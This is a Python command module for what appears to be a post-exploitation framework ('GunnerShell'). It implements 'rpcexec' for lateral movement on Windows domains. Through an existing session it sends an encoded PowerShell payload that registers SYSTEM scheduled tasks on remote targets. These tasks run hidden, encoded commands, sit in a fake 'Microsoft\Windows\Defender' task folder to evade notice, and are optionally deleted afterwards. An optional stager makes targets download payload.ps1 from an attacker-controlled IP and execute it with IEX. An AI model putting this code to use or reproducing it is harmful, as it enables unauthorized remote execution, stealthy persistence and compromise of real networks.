import sys
import os
import subprocess
import base64
import argparse

from core.gunnershell.commands.base import register, Command
from core import stager_server as stage
from core.session_handlers import session_manager

# Command Execution Imports
from core.command_execution import http_command_execution as http_exec
from core.command_execution import tcp_command_execution as tcp_exec

from colorama import Style, Fore
brightgreen  = "\001" + Style.BRIGHT + Fore.GREEN  + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred    = "\001" + Style.BRIGHT + Fore.RED    + "\002"

@register("rpcexec")
class RpcexecCommand(Command):
	"""Execute command via RPC scheduler on target"""

	@property
	def help(self):
		return "rpcexec -u <userfile> -p <passfile> -d <domain> -t <targets> --command <cmd> [flags]    RPC exec"

	def execute(self, args):
		parser = argparse.ArgumentParser(prog="rpcexec", add_help=False)
		parser.add_argument('-u','--users',  dest='userfile', required=True, help='Username or file')
		parser.add_argument('-p','--passes', dest='passfile', required=True, help='Password or file')
		parser.add_argument('-d','--domain', dest='domain',   required=True, help='AD domain')
		parser.add_argument('-t','--targets',dest='targets',  required=True, help='Targets list')
		parser.add_argument('--command',     dest='cmd',      required=True, help='Command to run')
		parser.add_argument('--svcname',     dest='svcname',  default="GunnerSvc", help='Service name to use')
		parser.add_argument('--cleanup',     action='store_true', dest='cleanup', help='Remove service & exe after run')
		parser.add_argument('--debug',       action='store_true', dest='debug', help='Enable verbose output')
		parser.add_argument('--stager',      action='store_true', dest='stager', help='Download & execute payload.ps1')
		parser.add_argument('--stager-port', dest='stager_port', type=int, default=8000, help='HTTP stager port (default:8000)')
		parser.add_argument('--stager-ip',   dest='stager_ip', help='IP to fetch stager payload from')

		try:
			opts = parser.parse_args(args)
		except SystemExit:
			print(brightyellow + self.help)
			return

		out = self.logic(
			self.gs.sid,
			opts.userfile,
			opts.passfile,
			opts.domain,
			opts.targets,
			command    = opts.cmd,
			svcname    = opts.svcname,
			cleanup    = opts.cleanup,
			debug      = opts.debug,
			stager     = opts.stager,
			stage_ip   = opts.stager_ip,
			stage_port = opts.stager_port,
			op_id      = self.op_id
		)

		if out:
			print(brightgreen + out if "[!]" not in out else out)
		else:
			print(brightyellow + "[*] No output")

	def logic(self, sid, userfile, passfile, domain, targets, command, svcname="GunnerSvc", cleanup=False, debug=False, stager=False, stage_ip=None, stage_port=8000, op_id="console"):
		# 1) load users
		if os.path.isfile(userfile):
			with open(userfile, 'r') as f:
				users = [u.strip() for u in f if u.strip()]
		else:
			users = [userfile]

		# 2) load passes
		if os.path.isfile(passfile):
			with open(passfile, 'r') as f:
				passes = [p.strip() for p in f if p.strip()]
		else:
			passes = [passfile]

		# 3) format PS arrays & variables
		users_ps   = "@(" + ",".join(f"'{u}'" for u in users) + ")"
		passes_ps  = "@(" + ",".join(f"'{p}'" for p in passes) + ")"
		targets_ps = "@(" + ",".join(f"'{t.strip()}'" for t in targets.split(',')) + ")"
		cmd_esc    = command.replace("'", "''")
		svc_esc    = svcname.replace("'", "''")
		cleanup_ps = "$true" if cleanup else "$false"

		# 4) build the PowerShell payload
		ps = f"""
$Targets = {targets_ps}
$Cmd     = '{cmd_esc}'
$Cleanup = {cleanup_ps}

foreach ($T in $Targets) {{
	
	$service = New-Object -ComObject "Schedule.Service"
	
	$service.Connect($T)
	$root = $service.GetFolder("\\")
	
	$taskDef = $service.NewTask(0)

	$trigger = $taskDef.Triggers.Create(1)
	$trigger.StartBoundary = (Get-Date).AddMinutes(1).ToString("yyyy-MM-ddTHH:mm:ss")

	$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Cmd))

	$action = $taskDef.Actions.Create(0)  # 0 = ExecAction
	$action.Path      = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
	$action.Arguments = "-NoProfile -WindowStyle Hidden -EncodedCommand $b64"

	$principal = $taskDef.Principal
	$principal.UserId    = "SYSTEM"
	$principal.LogonType = 5

	$taskName   = "GunnerTask_$([guid]::NewGuid().ToString('N').Substring(0,8))"
	$folderPath = "\\Microsoft\\Windows\\Defender"
	
	try {{ $folder = $root.GetFolder($folderPath) }}
	catch {{ $folder = $root.CreateFolder($folderPath, $null) }}

	
	$regTask = $folder.RegisterTaskDefinition($taskName, $taskDef, 6, $null, $null, 5)
	
	$regTask.Run($null) | Out-Null

	if ($Cleanup) {{
		Start-Sleep -Seconds 5
		$folder.DeleteTask($taskName, 0)
	}}
}}

Write-Output "THE BUMBACLUT IN THE BASKET"
"""

		# 5) base64‑encode & dispatch
		b64 = base64.b64encode(ps.encode('utf-16le')).decode()
		one_liner = (
			"$ps = [System.Text.Encoding]::Unicode"
			f".GetString([Convert]::FromBase64String(\"{b64}\")); "
			"Invoke-Expression $ps"
		)
	
		sess = session_manager.sessions.get(sid)
		if not sess:
			return brightred + "[!] Invalid session"

		transport = sess.transport.lower()

		if stager:
			u = f"http://{stage_ip}:{stage_port}/payload.ps1"
			ps_cmd = (
				f"$u='{u}';"
				"$xml=New-Object -ComObject 'MSXML2.ServerXMLHTTP.6.0';"
				"$xml.open('GET',$u,$false);"
				"$xml.send();"
				"IEX $xml.responseText"
			)

			stage.start_stager_server(stage_port, ps)

			if transport in ("http", "https"):
				out = http_exec.run_command_http(sid, ps_cmd, op_id=op_id)

			elif transport in ("tcp", "tls"):
				out = tcp_exec.run_command_tcp(sid, ps_cmd, timeout=0.5, portscan_active=True, op_id=op_id)

			else:
				return brightred + "[!] Unknown session transport!"

		else:
			if transport in ("http", "https"):
				out = http_exec.run_command_http(sid, one_liner, op_id=op_id)

			elif transport in ("tcp", "tls"):
				out = tcp_exec.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True, op_id=op_id)

			else:
				return brightred + "[!] Unknown transport detected!"

		
		if out:
			if "THE BUMBACLUT IN THE BASKET" in out:
				return brightgreen + f"[+] Successfully executed command on Target via RPC COM Scheduled task API"
			else:
				return out if debug else brightred + "[!] No successful RPCEXEC executions found"
		else:
			return brightred + "[!] No output from RPCEXEC attempt"